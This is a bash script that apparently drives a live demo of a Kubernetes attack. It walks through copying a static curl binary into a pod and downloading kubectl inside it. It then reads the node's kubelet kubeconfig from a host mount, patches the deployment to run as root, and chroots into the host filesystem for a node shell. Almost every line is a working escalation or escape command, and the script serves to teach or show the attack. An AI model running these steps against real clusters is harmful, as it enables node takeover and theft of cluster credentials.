#!/usr/bin/env bash

. ../scripts/demo-magic.sh
TYPE_SPEED=${SPEED:-}

pei "export KUBECONFIG=./user6-kubeconfig"
export KUBECONFIG=./user6-kubeconfig


echo "ℹ️ Deploy the app";read -s
pei "kubectl apply -f n6-deploy.yaml"
pei "kubectl wait --for=jsonpath='{.status.readyReplicas}=1' deploy/n6"

echo "❓ Can we read the pods or secrets in the victim's ns?"; read -s
pe "kubectl get secret -n secret6"
pe "kubectl get pod -n secret6"

echo "❓ What user am I using?"
pe "kubectl exec deploy/n6 -ti -- id"

echo "❓ Is curl avilable?";read -s
pei "kubectl exec deploy/n6 -ti -- curl --version"
echo "ℹ️ Download curl to the container via workstation";read -s
# pei "curl -Lo curl.tar.xz https://github.com/stunnel/static-curl/releases/download/8.9.1/curl-linux-i686-musl-8.9.1.tar.xz"
pei "curl -Lo curl.tar.xz https://github.com/stunnel/static-curl/releases/download/8.9.1/curl-linux-aarch64-musl-8.9.1.tar.xz"
pei "tar xJOf curl.tar.xz | base64 |  kubectl exec deploy/n6 -i -- sh -c 'base64 --decode > /tmp/curl;chmod +x /tmp/curl'"

echo "❓ Is kubectl avilable?";read -s
pei "kubectl exec deploy/n6 -ti -- kubectl --version"
echo "ℹ️ Download kubectl";read -s
# pei "kubectl exec deploy/n6 -ti -- /tmp/curl -o /tmp/kubectl -L https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl"
pei "kubectl exec deploy/n6 -ti -- /tmp/curl -o /tmp/kubectl -L https://dl.k8s.io/release/v1.31.0/bin/linux/arm64/kubectl"
pei "kubectl exec deploy/n6 -ti -- chmod +x /tmp/kubectl"

echo "ℹ️ Time to hack ";read -s
# kubectl exec deploy/n6 -ti -- env KUBECONFIG=/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin bash
pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/host/etc/kubernetes/kubelet.conf:/host/var/lib/kubelet/kubeconfig /tmp/kubectl get pod"

echo "ℹ️ I need to become root";read -s
pei "kubectl patch deployment n6 --patch-file=root.patch"
pei "kubectl rollout status -w deploy/n6"

echo "❓ What user am I using?"
pe "kubectl exec deploy/n6 -ti -- id"

echo "ℹ️ Download tools (kubeclt + curl)"
pei "curl -Lo curl.tar.xz https://github.com/stunnel/static-curl/releases/download/8.9.1/curl-linux-aarch64-musl-8.9.1.tar.xz"
pei "tar xJOf curl.tar.xz | base64 |  kubectl exec deploy/n6 -i -- sh -c 'base64 --decode > /tmp/curl;chmod +x /tmp/curl'"
pei "kubectl exec deploy/n6 -ti -- /tmp/curl -o /tmp/kubectl -L https://dl.k8s.io/release/v1.31.0/bin/linux/arm64/kubectl"
pei "kubectl exec deploy/n6 -ti -- chmod +x /tmp/kubectl"


echo "ℹ️ Time to hack again 🤥";read -s
# kubectl exec deploy/n6 -ti -- env KUBECONFIG=/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin bash

pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/host/etc/kubernetes/kubelet.conf:/host/var/lib/kubelet/kubeconfig /tmp/kubectl get pod"
pe "kubectl exec deploy/n6 -ti -- cp /tmp/kubectl /host/tmp/"
pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/etc/kubernetes/kubelet.conf:/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin chroot /host /bin/bash"


